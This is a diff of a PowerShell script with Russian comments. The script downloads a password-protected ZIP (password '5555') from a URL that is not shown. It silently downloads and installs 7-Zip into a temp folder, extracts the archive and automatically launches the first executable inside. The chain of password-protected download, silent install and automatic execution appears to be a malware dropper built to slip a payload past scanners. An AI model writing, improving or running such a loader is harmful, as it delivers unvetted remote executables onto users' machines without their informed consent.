@@ -6,9 +6,8 @@ $password="5555"
 
 if(-not(Test-Path $targetFolder)){New-Item -ItemType Directory -Path $targetFolder -Force}
 
-Write-Host "Downloading..." -ForegroundColor Yellow
+Write-Host "Downloading ZIP..." -ForegroundColor Yellow
 try{
-    # Скачиваем файл
     Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
     $fileSize=(Get-Item $zipPath).Length
     Write-Host "ZIP size: $([math]::Round($fileSize/1MB,2)) MB" -ForegroundColor Cyan
@@ -18,63 +17,47 @@ try{
         if(Test-Path $extractPath){Remove-Item $extractPath -Recurse -Force}
         New-Item -ItemType Directory -Path $extractPath -Force
         
-        # Метод 1: 7-Zip
-        Write-Host "Trying 7-Zip..." -ForegroundColor Yellow
-        $7zipPaths=@("$env:ProgramFiles\7-Zip\7z.exe","${env:ProgramFiles(x86)}\7-Zip\7z.exe")
-        foreach($7zipPath in $7zipPaths){
-            if(Test-Path $7zipPath){
-                Write-Host "Using 7-Zip: $7zipPath" -ForegroundColor Gray
-                & $7zipPath x "-p$password" "-o$extractPath" "-y" $zipPath
-                break
-            }
-        }
+        # Скачиваем 7-Zip portable
+        Write-Host "Downloading 7-Zip Portable..." -ForegroundColor Yellow
+        $7zUrl="https://www.7-zip.org/a/7z2301-x64.exe"
+        $7zInstaller="$env:TEMP\7z.exe"
+        Invoke-WebRequest -Uri $7zUrl -OutFile $7zInstaller
         
-        # Метод 2: WinRAR
-        if(-not(@(Get-ChildItem $extractPath -ErrorAction SilentlyContinue).Count -gt 0)){
-            Write-Host "Trying WinRAR..." -ForegroundColor Yellow
-            $winrarPaths=@("$env:ProgramFiles\WinRAR\WinRAR.exe","${env:ProgramFiles(x86)}\WinRAR\WinRAR.exe")
-            foreach($winrarPath in $winrarPaths){
-                if(Test-Path $winrarPath){
-                    Write-Host "Using WinRAR: $winrarPath" -ForegroundColor Gray
-                    & $winrarPath x "-p$password" "-y" "-ibck" $zipPath $extractPath
-                    break
-                }
-            }
-        }
+        # Распаковываем 7-Zip
+        $7zFolder="$env:TEMP\7z"
+        if(Test-Path $7zFolder){Remove-Item $7zFolder -Recurse -Force}
+        New-Item -ItemType Directory -Path $7zFolder -Force
         
-        # Метод 3: Bandizip
-        if(-not(@(Get-ChildItem $extractPath -ErrorAction SilentlyContinue).Count -gt 0)){
-            Write-Host "Trying Bandizip..." -ForegroundColor Yellow
-            $bandizipPaths=@("$env:ProgramFiles\Bandizip\Bandizip.exe","${env:ProgramFiles(x86)}\Bandizip\Bandizip.exe")
-            foreach($bandizipPath in $bandizipPaths){
-                if(Test-Path $bandizipPath){
-                    Write-Host "Using Bandizip: $bandizipPath" -ForegroundColor Gray
-                    & $bandizipPath x -p:"$password" -o:"$extractPath" -y $zipPath
-                    break
-                }
-            }
-        }
+        # Извлекаем 7z.exe из установщика
+        Start-Process -FilePath $7zInstaller -ArgumentList "/S","/D=$7zFolder" -Wait
         
-        # Проверяем результат
-        $extractedFiles=@(Get-ChildItem $extractPath -ErrorAction SilentlyContinue)
-        Write-Host "Extracted files: $($extractedFiles.Count)" -ForegroundColor Cyan
+        # Ищем 7z.exe
+        $7zExe=Get-ChildItem -Path $7zFolder -Recurse -Filter "7z.exe" | Select-Object -First 1
         
-        if($extractedFiles.Count -gt 0){
-            Write-Host "SUCCESS! Files extracted:" -ForegroundColor Green
-            $extractedFiles | ForEach-Object { Write-Host " - $($_.Name) ($([math]::Round($_.Length/1KB,2)) KB)" -ForegroundColor Gray }
+        if($7zExe){
+            Write-Host "Extracting with 7-Zip..." -ForegroundColor Green
+            & $7zExe.FullName x "-p$password" "-o$extractPath" "-y" $zipPath
             
-            # Запускаем EXE
-            $exeFile=$extractedFiles | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
-            if($exeFile){
-                Write-Host "Starting: $($exeFile.Name)" -ForegroundColor Green
-                Start-Process -FilePath "$extractPath\$($exeFile.Name)"
+            # Проверяем результат
+            $extractedFiles=@(Get-ChildItem $extractPath -ErrorAction SilentlyContinue)
+            if($extractedFiles.Count -gt 0){
+                Write-Host "SUCCESS! Files extracted: $($extractedFiles.Count)" -ForegroundColor Green
+                $exeFile=$extractedFiles | Where-Object{$_.Extension -eq '.exe'} | Select-Object -First 1
+                if($exeFile){
+                    Write-Host "Starting: $($exeFile.Name)" -ForegroundColor Green
+                    Start-Process -FilePath "$extractPath\$($exeFile.Name)"
+                }
+            }else{
+                Write-Host "Extraction failed with 7-Zip" -ForegroundColor Red
+                Invoke-Item $targetFolder
             }
         }else{
-            Write-Host "FAILED: No files extracted" -ForegroundColor Red
-            Write-Host "Please extract manually with: $password" -ForegroundColor Yellow
+            Write-Host "7-Zip not found, opening folder for manual extraction" -ForegroundColor Yellow
+            Write-Host "Password: $password" -ForegroundColor Cyan
             Invoke-Item $targetFolder
         }
     }
 }catch{
     Write-Host "Error: $_" -ForegroundColor Red
+    Invoke-Item $targetFolder
 }
